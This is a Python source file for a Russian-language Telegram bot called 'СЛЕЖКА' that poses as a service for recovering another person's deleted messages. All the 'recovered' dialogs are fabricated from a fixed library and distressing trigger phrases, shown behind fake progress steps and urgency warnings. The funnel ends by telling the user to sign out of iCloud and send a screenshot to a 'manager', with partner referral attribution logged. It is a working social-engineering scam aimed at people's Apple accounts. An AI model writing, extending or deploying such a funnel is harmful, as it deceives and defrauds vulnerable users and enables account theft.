"""
Telegram-бот воронки «СЛЕЖКА» (aiogram, polling, MemoryStorage).
"""

import asyncio
import hashlib
import html
import logging
import os
import random
from typing import Any

try:
    from aiogram import Bot, Dispatcher, F, Router
    from aiogram.client.default import DefaultBotProperties
    from aiogram.exceptions import TelegramConflictError, TelegramNetworkError
    from aiogram.filters import Command, StateFilter
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardRemove
except ModuleNotFoundError as exc:
    if exc.name not in {"aiogram"} and not str(exc.name).startswith("aiogram."):
        raise

    # Keep the module importable in test/runtime environments where aiogram
    # is unavailable for the current interpreter.
    class TelegramConflictError(Exception):
        pass


    class TelegramNetworkError(Exception):
        pass


    class DefaultBotProperties:
        def __init__(self, **_: Any) -> None:
            pass


    class _DummySession:
        async def close(self) -> None:
            return None


    class Bot:
        def __init__(self, *_: Any, **__: Any) -> None:
            self.session = _DummySession()

        async def delete_webhook(self, **_: Any) -> None:
            return None


    class Dispatcher:
        def __init__(self, *_: Any, **__: Any) -> None:
            pass

        def include_router(self, *_: Any, **__: Any) -> None:
            return None

        async def start_polling(self, *_: Any, **__: Any) -> None:
            raise RuntimeError("aiogram is not installed")


    class _DummyFilter:
        def __getattr__(self, _: str) -> "_DummyFilter":
            return self

        def __call__(self, *_: Any, **__: Any) -> "_DummyFilter":
            return self

        def __eq__(self, _: object) -> "_DummyFilter":
            return self

        def startswith(self, *_: Any, **__: Any) -> "_DummyFilter":
            return self


    F = _DummyFilter()


    class Router:
        def message(self, *_: Any, **__: Any):
            def decorator(func):
                return func

            return decorator

        def callback_query(self, *_: Any, **__: Any):
            def decorator(func):
                return func

            return decorator


    class FSMContext:
        pass


    class State:
        pass


    class StatesGroup:
        pass


    class MemoryStorage:
        pass


    class InlineKeyboardButton:
        def __init__(self, text: str, callback_data: str | None = None, url: str | None = None) -> None:
            self.text = text
            self.callback_data = callback_data
            self.url = url


    class InlineKeyboardMarkup:
        def __init__(self, inline_keyboard: list[list[InlineKeyboardButton]] | None = None) -> None:
            self.inline_keyboard = inline_keyboard or []


    class Message:
        pass


    class ReplyKeyboardRemove:
        pass


    def Command(*_: Any, **__: Any) -> object:
        return object()


    def StateFilter(*_: Any, **__: Any) -> object:
        return object()
from dotenv import load_dotenv

import db

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
load_dotenv(os.path.join(BASE_DIR, ".env"))

BOT_TOKEN = os.getenv("BOT_TOKEN", "<BOT_TOKEN>")
PROXY_URL = os.getenv("PROXY_URL")  # socks5://user:pass@host:port or http://host:port
MANAGER_USERNAME = "managerayugram_here"
MANAGER_LINK = f"https://t.me/{MANAGER_USERNAME}"

LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)

# Use /srv/slezhka/shared for logs (writable by slezhka user)
log_path = os.path.join("/srv/slezhka/shared", "bot_runtime.log") if os.path.exists("/srv/slezhka/shared") else "runtime.log"
file_handler = logging.FileHandler(log_path, encoding="utf-8")
file_handler.setFormatter(logging.Formatter(LOG_FORMAT))
logger.addHandler(file_handler)


class SearchStates(StatesGroup):
    waiting_target = State()
    results_ready = State()
    dialog_list = State()
    dialog_fragment = State()
    device_choice = State()


bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
POLLING_CONFLICT_EXIT_CODE = 75


WELCOME_TEXT = (
    "👋 <b>Привет! Это СЛЕЖКА.</b>\n\n"
    "Здесь ты можешь быстро проверить скрытую активность, восстановить удалённые фрагменты "
    "и открыть полный диалог через приложение.\n\n"
    "Нажми кнопку ниже и начнём проверку."
)

ASK_TARGET_TEXT = "🎯 Введи @username человека, которого хочешь проверить."

DIALOGS_INTRO_TEXT = (
    "⚠️ Данные частично восстановлены и могут быть искажены.\n"
    "В приложении увидишь полные и точные сообщения и диалоги.\n\n"
    "Выбери диалог:"
)

UNLOCK_TEXT = (
    "🚫 <b>Полный диалог заблокирован.</b>\n\n"
    "Сейчас доступна только демо-версия фрагментов. "
    "Чтобы открыть весь текст и скрытые части — установи приложение.\n\n"
    "⏳ Окно восстановления ограничено: данные могут исчезнуть в любой момент."
)

IPHONE_TEXT = (
    "📱 <b>СЛЕЖКА — одно приложение, чтобы знать всё</b>\n\n"
    "<b>Что откроется после установки:</b>\n"
    "• 👀 Удалённые сообщения — видишь, что скрыли.\n"
    "• 💬 Активные контакты — с кем переписывается чаще всего.\n"
    "• 🗂 Архив и скрытые чаты — что обычно прячут.\n"
    "• 🔗 Закреплённые диалоги — приоритетные переписки.\n"
    "• ♻️ Полное восстановление цепочки сообщений.\n"
    "• 🔒 Режим невидимки для просмотра.\n\n"
    "🔥 Установи сейчас, чтобы открыть полный диалог без обрезки."
)

ANDROID_TEXT = (
    "🤖 <b>Версия СЛЕЖКА для Android ещё в разработке.</b>\n\n"
    "Сейчас полный функционал доступен на iPhone.\n"
    "Если есть iPhone — нажми /start и выбери iPhone."
)

ICLOUD_EXIT_TEXT = (
    "🔐 <b>Финальный шаг: выйди из iCloud и отправь скрин менеджеру</b>\n\n"
    "📋 <b>Как выйти из iCloud:</b>\n"
    "• Открой <b>Настройки</b> на iPhone\n"
    "• Нажми на своё имя вверху\n"
    "• Пролистай вниз и нажми <b>Выйти</b>\n\n"
    "📌 <b>Если попросит:</b>\n"
    "• Введи пароль Apple ID\n"
    "• Нажми <b>Выйти</b>\n"
    "• Если появится «Выйти, но не стирать данные» — выбери этот пункт\n"
    "• Подтверди кнопкой <b>Продолжить</b>\n\n"
    "✅ Когда имя аккаунта исчезнет из настроек, сделай скрин и отправь его менеджеру прямо в диалог."
)

TRIGGER_LINES = [
    "он сейчас рядом.",
    "я у него дома.",
    "он всё слышит.",
    "не пиши больше. пожалуйста.",
    "я сделала ошибку.",
    "ты всё испортил.",
    "я беременна.",
    "я не одна.",
    "я люблю его.",
    "мы договорились.",
]

DIALOG_LIBRARY = [
    {
        "id": "d1",
        "button": "Саша ❤️",
        "tag": "близкий контакт",
        "fragments": {
            "1": ["ты где?", "позже отвечу", "он рядом?"],
            "2": ["не звони", "я не одна", "прочитай и сотри"],
            "3": ["всё сложнее чем кажется", "он всё слышит."],
        },
    },
    {
        "id": "d2",
        "button": "Женя 💬",
        "tag": "архив",
        "fragments": {
            "1": ["удалил переписку?", "да", "почему молчишь"],
            "2": ["я у двери", "тихо", "не пиши сюда"],
            "3": ["мы договорились.", "я не одна."],
        },
    },
    {
        "id": "d3",
        "button": "Ник 🔥",
        "tag": "частый контакт",
        "fragments": {
            "1": ["ты видел это?", "нет", "тогда не открывай"],
            "2": ["он был в сети", "я у него дома.", "не провоцируй"],
            "3": ["уже поздно", "ты всё испортил."],
        },
    },
    {
        "id": "d4",
        "button": "Валера 👀",
        "tag": "коллега",
        "fragments": {
            "1": ["отправил отчёт", "не мне", "почему?"],
            "2": ["я предупредил", "сейчас не время", "удали это"],
            "3": ["не пиши больше. пожалуйста.", "он сейчас рядом."],
        },
    },
    {
        "id": "d5",
        "button": "Неизвестный 📱",
        "tag": "неизвестный контакт",
        "fragments": {
            "1": ["это ты?", "да", "как нашёл этот номер"],
            "2": ["я не могу говорить", "он рядом", "прочитай молча"],
            "3": ["я сделала ошибку.", "я люблю его."],
        },
    },
    {
        "id": "d6",
        "button": "Макс ✨",
        "tag": "закреплённый чат",
        "fragments": {
            "1": ["не открывай чат", "почему", "там всё видно"],
            "2": ["я у подъезда", "ответь одним словом", "без звонков"],
            "3": ["я беременна.", "мы договорились."],
        },
    },
    {
        "id": "d7",
        "button": "Курьер 📦",
        "tag": "служебный",
        "fragments": {
            "1": ["посылка у двери", "кто заказал", "не подписывай"],
            "2": ["он уже знает", "выйди один", "я подожду"],
            "3": ["я не одна.", "он всё слышит."],
        },
    },
    {
        "id": "d8",
        "button": "Лео 🕐",
        "tag": "ночные сообщения",
        "fragments": {
            "1": ["ты не спишь?", "почти", "читай аккуратно"],
            "2": ["я рядом", "не упоминай имя", "сохрани тишину"],
            "3": ["я у него дома.", "ты всё испортил."],
        },
    },
]


def get_start_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="✅ Проверить", callback_data="start_check")]]
    )


def get_manager_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="📨 Отправить скрин менеджеру", url=MANAGER_LINK)]]
    )


def get_device_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 iPhone", callback_data="device_iphone")],
            [InlineKeyboardButton(text="🤖 Android", callback_data="device_android")],
        ]
    )


def _normalize_target_key(raw: str) -> str:
    s = (raw or "").strip()
    if s.startswith("@"):
        s = s[1:]
    return " ".join(s.lower().split())


def _rng_for_seed(seed_key: str) -> random.Random:
    digest = hashlib.sha256(("slezhka:" + seed_key).encode("utf-8")).digest()
    seed = int.from_bytes(digest[:8], "big")
    return random.Random(seed)


def pick_dialogs_for_target(target_key: str, user_id: int) -> list[dict[str, Any]]:
    seed_key = f"dialogs:{target_key}:{user_id}"
    rng = _rng_for_seed(seed_key)
    count = rng.randint(3, min(8, len(DIALOG_LIBRARY)))

    indices = list(range(len(DIALOG_LIBRARY)))
    rng.shuffle(indices)

    selected: list[dict[str, Any]] = []
    for idx in indices[:count]:
        base = DIALOG_LIBRARY[idx]
        dialog = {
            "id": base["id"],
            "button": base["button"],
            "tag": base["tag"],
            "deleted_count": rng.randint(4, 23),
            "has_link": rng.random() < 0.45,
            "fragments": {k: list(v) for k, v in base["fragments"].items()},
        }

        end_line = rng.choice(TRIGGER_LINES)
        last_fragment = dialog["fragments"].get("3", [])
        if last_fragment:
            last_fragment[-1] = end_line
            dialog["fragments"]["3"] = last_fragment

        selected.append(dialog)

    return selected


def build_dialogs_keyboard(dialogs: list[dict[str, Any]]) -> InlineKeyboardMarkup:
    rows = []
    for d in dialogs:
        suffix = " 🔗" if d.get("has_link") else ""
        text = f"{d['button']}{suffix} — {d['deleted_count']} фрагм."
        rows.append([InlineKeyboardButton(text=text, callback_data=f"pick_dialog:{d['id']}")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def build_fragment_keyboard(stage: int) -> InlineKeyboardMarkup:
    if stage == 1:
        return InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="➡️ Следующий фрагмент", callback_data="next_fragment")]]
        )
    if stage == 2:
        return InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="➡️ Последний фрагмент", callback_data="next_fragment")]]
        )
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔓 Посмотреть диалог полностью", callback_data="unlock_full")],
            [InlineKeyboardButton(text="👁 Другой диалог", callback_data="other_dialog")],
        ]
    )


def render_fragment(dialog: dict[str, Any], idx: int) -> str:
    base = dialog.get("fragments", {}).get(str(idx), [])
    rng = _rng_for_seed(f"frag:{dialog.get('id', 'x')}:{idx}")

    contact_name = (dialog.get("button") or "Контакт").split()[0]
    hour = rng.randint(9, 23)
    minute = rng.randint(0, 45)

    lines: list[str] = []
    for i, phrase in enumerate(base):
        speaker = contact_name if i % 2 == 0 else "Ты"
        minute += rng.randint(1, 3)
        timestamp = f"{hour:02d}:{minute:02d}"
        if rng.random() < 0.25:
            lines.append(f"{timestamp} {speaker}: [сообщение повреждено — восстановление в приложении]")
        lines.append(f"{timestamp} {speaker}: {phrase}")

    body = "\n".join(lines)
    header = (
        f"💬 <b>Диалог: {html.escape(dialog.get('button', 'Контакт'))}</b>\n"
        "🟣 Демо-режим — полный текст откроется после установки приложения\n\n"
        f"🔐 Фрагмент {idx}/3 ({html.escape(dialog.get('tag', 'контакт'))})\n\n"
    )

    if idx == 3:
        body += "\n\n🚨 Концовка уже найдена. Открой полный диалог, пока данные не удалены окончательно."

    return header + body


async def _show_dialog_list(message_or_callback_msg: Message, state: FSMContext, user_id: int) -> bool:
    data = await state.get_data()
    dialogs = data.get("dialogs")
    target_key = data.get("target_key")

    if not dialogs and target_key:
        dialogs = pick_dialogs_for_target(str(target_key), user_id)
        await state.update_data(dialogs=dialogs, selected_dialog_id=None, fragment_index=1)

    if not dialogs:
        await message_or_callback_msg.edit_text("Сессия устарела. Нажми /start и начни заново.")
        await state.clear()
        return False

    keyboard = build_dialogs_keyboard(dialogs)
    keyboard.inline_keyboard.append(
        [InlineKeyboardButton(text="📲 Установить приложение", callback_data="device_iphone")]
    )
    await message_or_callback_msg.edit_text(DIALOGS_INTRO_TEXT, reply_markup=keyboard)
    await state.set_state(SearchStates.dialog_list)
    return True


async def _show_icloud_exit_and_finish(message: Message, state: FSMContext, user_id: int, source: str) -> None:
    db.log_event(
        user_id,
        "manager_redirect_clicked",
        {"source": source, "manager": f"@{MANAGER_USERNAME}"},
    )
    await message.edit_text(ICLOUD_EXIT_TEXT, reply_markup=get_manager_keyboard())
    await state.clear()


@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()

    user = message.from_user
    db.upsert_user(
        user_id=user.id,
        username=user.username,
        first_name=user.first_name or "",
        last_name=user.last_name,
    )

    payload = None
    if message.text and " " in message.text:
        payload = message.text.split(" ", 1)[1].strip() or None

    code = payload
    if code:
        link = db.get_active_link(code)
        if link:
            real_code = str(link["code"])
            db.log_event(user.id, "start", {"payload": payload}, code=real_code)
            partner_id = link["partner_id"]
            manager_id = None
            if partner_id:
                partner = db.get_partner(int(partner_id))
                if partner:
                    manager_id = partner["manager_id"]
            db.set_user_attribution(
                user_id=user.id,
                code=real_code,
                partner_id=int(partner_id) if partner_id else None,
                manager_id=int(manager_id) if manager_id else None,
            )
        else:
            db.log_event(user.id, "start", {"payload": payload})
    else:
        db.log_event(user.id, "start", {"payload": payload})

    await message.answer(WELCOME_TEXT, reply_markup=get_start_keyboard())
    await state.set_state(SearchStates.waiting_target)


@router.callback_query(F.data == "start_check")
async def cb_start_check(callback, state: FSMContext):
    await callback.answer()
    await state.set_state(SearchStates.waiting_target)
    await callback.message.edit_text(ASK_TARGET_TEXT)


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    db.log_event(message.from_user.id, "cancel")
    await message.answer(
        "❌ Проверка остановлена.\n\n↩️ Чтобы начать снова — нажми /start.",
        reply_markup=ReplyKeyboardRemove(),
    )


@router.message(StateFilter(SearchStates.waiting_target))
async def process_nickname(message: Message, state: FSMContext):
    if not message.text:
        await message.answer("⚠️ Нужен текстовый @username. Попробуй ещё раз.")
        return

    raw = message.text.strip()
    if len(raw) > 50:
        await message.answer("⚠️ Слишком длинно. Введи обычный @username.")
        return

    original_nickname = raw
    target_key = _normalize_target_key(raw)
    escaped_nickname = html.escape(original_nickname)

    db.log_event(message.from_user.id, "target_entered", {"nickname": original_nickname})

    search_msg = await message.answer(f"🔍 Подключаюсь к данным {escaped_nickname}...")
    await asyncio.sleep(1.2)
    await search_msg.edit_text(f"🔎 Анализирую скрытую активность {escaped_nickname}...")
    await asyncio.sleep(1.2)
    await search_msg.edit_text("🧩 Восстанавливаю удалённые фрагменты диалогов...")
    await asyncio.sleep(1.2)

    dialogs = pick_dialogs_for_target(target_key, message.from_user.id)
    await search_msg.edit_text(
        f"✅ Найдено {len(dialogs)} удалённых фрагментов (часть повреждена)",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="👁 Посмотреть диалоги", callback_data="view_dialogs")]]
        ),
    )

    await state.update_data(
        dialogs=dialogs,
        selected_dialog_id=None,
        fragment_index=1,
        target_key=target_key,
        original_nickname=original_nickname,
    )
    await state.set_state(SearchStates.results_ready)


@router.callback_query(F.data == "view_results")
async def process_view_results(callback, state: FSMContext):
    # Совместимость со старой кнопкой.
    ok = await _show_dialog_list(callback.message, state, callback.from_user.id)
    if ok:
        db.log_event(callback.from_user.id, "dialogs_shown", {"source": "legacy_view_results"})
    await callback.answer()


@router.callback_query(F.data == "view_dialogs")
async def cb_view_dialogs(callback, state: FSMContext):
    ok = await _show_dialog_list(callback.message, state, callback.from_user.id)
    if ok:
        db.log_event(callback.from_user.id, "dialogs_shown", {})
    await callback.answer()


@router.callback_query(F.data.startswith("pick_dialog:"))
async def cb_pick_dialog(callback, state: FSMContext):
    dialog_id = callback.data.split(":", 1)[1]
    data = await state.get_data()
    dialogs = data.get("dialogs") or []

    dialog = next((d for d in dialogs if d.get("id") == dialog_id), None)
    if not dialog:
        target_key = data.get("target_key")
        if not target_key:
            await callback.message.edit_text("Сессия устарела. Нажми /start и начни заново.")
            await state.clear()
            await callback.answer()
            return

        dialogs = pick_dialogs_for_target(str(target_key), callback.from_user.id)
        await state.update_data(dialogs=dialogs)
        dialog = next((d for d in dialogs if d.get("id") == dialog_id), None)
        if not dialog:
            await callback.message.edit_text("Не удалось открыть диалог. Выбери другой.")
            await callback.answer()
            return

    await state.update_data(selected_dialog_id=dialog_id, fragment_index=1)
    await callback.message.edit_text(render_fragment(dialog, 1), reply_markup=build_fragment_keyboard(1))
    db.log_event(callback.from_user.id, "dialog_opened", {"dialog_id": dialog_id, "tag": dialog.get("tag")})
    await state.set_state(SearchStates.dialog_fragment)
    await callback.answer()


@router.callback_query(F.data == "next_fragment")
async def cb_next_fragment(callback, state: FSMContext):
    data = await state.get_data()
    dialog_id = data.get("selected_dialog_id")
    dialogs = data.get("dialogs") or []
    dialog = next((d for d in dialogs if d.get("id") == dialog_id), None)

    if not dialog:
        await callback.answer("Диалог недоступен. Выбери другой.")
        return

    idx = min(int(data.get("fragment_index", 1)) + 1, 3)
    await state.update_data(fragment_index=idx)
    await callback.message.edit_text(render_fragment(dialog, idx), reply_markup=build_fragment_keyboard(idx))
    db.log_event(callback.from_user.id, "fragment_shown", {"dialog_id": dialog_id, "fragment": idx})
    await state.set_state(SearchStates.dialog_fragment)
    await callback.answer()


@router.callback_query(F.data == "other_dialog")
async def cb_other_dialog(callback, state: FSMContext):
    ok = await _show_dialog_list(callback.message, state, callback.from_user.id)
    if ok:
        await state.update_data(selected_dialog_id=None, fragment_index=1)
    await callback.answer()


@router.callback_query(F.data == "unlock_full")
async def cb_unlock_full(callback, state: FSMContext):
    data = await state.get_data()
    db.log_event(callback.from_user.id, "unlock_clicked", {"dialog_id": data.get("selected_dialog_id")})

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📲 Установить приложение", callback_data="device_iphone")],
            [InlineKeyboardButton(text="👁 Посмотреть другой диалог", callback_data="other_dialog")],
        ]
    )
    await callback.message.edit_text(UNLOCK_TEXT, reply_markup=keyboard)
    await state.set_state(SearchStates.device_choice)
    await callback.answer()


@router.callback_query(F.data == "device_android")
async def process_android(callback, state: FSMContext):
    await callback.answer()
    db.log_event(callback.from_user.id, "device_android")
    await callback.message.edit_text(ANDROID_TEXT, reply_markup=get_device_keyboard())
    await state.set_state(SearchStates.device_choice)


@router.callback_query(F.data == "device_iphone")
async def process_iphone(callback, state: FSMContext):
    await callback.answer()
    db.log_event(callback.from_user.id, "device_iphone")
    db.log_event(callback.from_user.id, "install_clicked")

    kb = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="📲 Установить приложение", callback_data="install_ayugram")]]
    )
    await callback.message.edit_text(IPHONE_TEXT, reply_markup=kb)
    await state.set_state(SearchStates.device_choice)


@router.callback_query(F.data == "install_ayugram")
async def process_install_ayugram(callback, state: FSMContext):
    await callback.answer()
    db.log_event(callback.from_user.id, "install_ayugram_clicked")
    await _show_icloud_exit_and_finish(
        callback.message,
        state,
        callback.from_user.id,
        source="install_ayugram_direct",
    )


@router.callback_query(F.data == "open_manager")
async def process_open_manager(callback, state: FSMContext):
    await callback.answer()
    await _show_icloud_exit_and_finish(
        callback.message,
        state,
        callback.from_user.id,
        source="legacy_open_manager",
    )


@router.callback_query(F.data == "installed")
async def process_installed_legacy(callback, state: FSMContext):
    # Совместимость со старой кнопкой "Я установил".
    await callback.answer()
    await _show_icloud_exit_and_finish(
        callback.message,
        state,
        callback.from_user.id,
        source="legacy_installed",
    )


@router.message()
async def handle_other_messages(message: Message, state: FSMContext):
    current_state = await state.get_state()

    if current_state is None and message.text and not message.text.startswith("/"):
        await state.set_state(SearchStates.waiting_target)
        await process_nickname(message, state)
        return

    if current_state is None and message.photo:
        await message.answer("Напиши /start, чтобы начать проверку и пройти шаги заново.")
        return


async def main():
    dp.include_router(router)
    db.init_db()

    logger.info("🚀 Бот запущен")

    # Ensure polling is the single update mechanism on this runtime.
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Webhook удалён, pending updates очищены")
    except Exception:
        logger.exception("❌ Не удалось сбросить webhook перед polling")

    backoff_s = 2
    try:
        while True:
            try:
                await dp.start_polling(bot, allowed_updates=["message", "callback_query"])
                return 0
            except TelegramConflictError as e:
                logger.error(
                    "❌ Конфликт polling-инстансов: %s. "
                    "Завершаю процесс без автоповтора, чтобы не спамить getUpdates.",
                    e,
                )
                return POLLING_CONFLICT_EXIT_CODE
            except asyncio.CancelledError:
                raise
            except TelegramNetworkError as e:
                logger.error("❌ Telegram недоступен: %s. Повтор через %s сек.", e, backoff_s)
            except Exception:
                logger.exception("❌ Polling упал. Повтор через %s сек.", backoff_s)

            await asyncio.sleep(backoff_s)
            backoff_s = min(backoff_s * 2, 60)
    finally:
        await bot.session.close()


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
